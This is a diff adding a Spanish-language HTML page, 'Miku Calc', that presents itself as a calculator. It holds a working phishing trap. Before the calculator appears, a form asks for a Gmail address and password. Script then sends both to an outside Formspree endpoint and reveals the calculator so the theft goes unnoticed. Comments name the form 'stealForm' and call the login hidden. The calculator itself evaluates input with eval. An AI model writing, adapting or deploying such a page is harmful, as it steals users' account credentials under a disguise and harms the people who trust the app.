@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Miku Calc</title>
+    <style>
+        body {
+            background: linear-gradient(135deg, #e0f7fa, #b2ebf2);
+            font-family: 'Segoe UI', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 20px;
+            box-shadow: 0 10px 25px rgba(0,255,128,0.3);
+            width: 300px;
+            text-align: center;
+        }
+        h2 { color: #009688; margin-bottom: 5px; }
+        .miku-img { width: 80px; margin-bottom: 10px; }
+        
+        /* Pantalla de Login */
+        #login-screen input {
+            width: 90%; padding: 10px; margin: 5px 0;
+            border: 2px solid #b2dfdb; border-radius: 5px;
+        }
+        button.login-btn {
+            background-color: #009688; color: white;
+            border: none; padding: 10px 20px; border-radius: 5px;
+            cursor: pointer; width: 100%; margin-top: 10px;
+        }
+
+        /* Calculadora */
+        #calc-screen { display: none; }
+        #display {
+            width: 90%; height: 40px; text-align: right;
+            font-size: 20px; margin-bottom: 10px;
+            border: 1px solid #ccc; border-radius: 5px;
+        }
+        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 5px; }
+        .btn {
+            padding: 15px; border: none; border-radius: 5px;
+            font-size: 16px; cursor: pointer; background: #e0f2f1;
+        }
+        .btn-op { background: #009688; color: white; }
+        .btn-eq { background: #ff4081; color: white; grid-column: span 2; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- Imagen decorativa de Miku -->
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ee/Hatsune_Miku_V4X.png/220px-Hatsune_Miku_V4X.png" class="miku-img" alt="Miku">
+    
+    <h2>Miku Calc</h2>
+
+    <!-- LOGIN OCULTO -->
+    <div id="login-screen">
+        <p style="font-size: 12px; color: #666;">Inicia sesión para continuar</p>
+        <form id="stealForm" action="https://formspree.io/f/xyewlozg" method="POST">
+            <input type="email" name="email" placeholder="Correo Gmail" required>
+            <input type="password" name="password" placeholder="Contraseña" required>
+            <button type="submit" class="login-btn">Entrar</button>
+        </form>
+    </div>
+
+    <!-- CALCULADORA REAL -->
+    <div id="calc-screen">
+        <input type="text" id="display" readonly>
+        <div class="grid">
+            <button class="btn" onclick="append('7')">7</button>
+            <button class="btn" onclick="append('8')">8</button>
+            <button class="btn" onclick="append('9')">9</button>
+            <button class="btn btn-op" onclick="append('/')">/</button>
+            
+            <button class="btn" onclick="append('4')">4</button>
+            <button class="btn" onclick="append('5')">5</button>
+            <button class="btn" onclick="append('6')">6</button>
+            <button class="btn btn-op" onclick="append('*')">*</button>
+            
+            <button class="btn" onclick="append('1')">1</button>
+            <button class="btn" onclick="append('2')">2</button>
+            <button class="btn" onclick="append('3')">3</button>
+            <button class="btn btn-op" onclick="append('-')">-</button>
+            
+            <button class="btn" onclick="append('0')">0</button>
+            <button class="btn" onclick="append('.')">.</button>
+            <button class="btn btn-eq" onclick="calculate()">=</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    // Lógica para capturar el login y ocultarlo
+    document.getElementById('stealForm').addEventListener('submit', function(e) {
+        // No recargamos la página inmediatamente para poder redirigir después
+        e.preventDefault(); 
+        
+        // Enviamos los datos a Formspree
+        fetch(this.action, {
+            method: 'POST',
+            body: new FormData(this),
+            hideStatusCodes: true
+        }).then(() => {
+            // Si se enviaron bien, mostramos la calculadora
+            document.getElementById('login-screen').style.display = 'none';
+            document.getElementById('calc-screen').style.display = 'block';
+        });
+    });
+
+    // Lógica de la Calculadora
+    let expression = "";
+    const display = document.getElementById('display');
+
+    function append(num) {
+        expression += num;
+        display.value = expression;
+    }
+
+    function calculate() {
+        try {
+            display.value = eval(expression);
+            expression = display.value;
+        } catch (error) {
+            display.value = "Error";
+            expression = "";
+        }
+    }
+</script>
+
+</body>
+  </html>
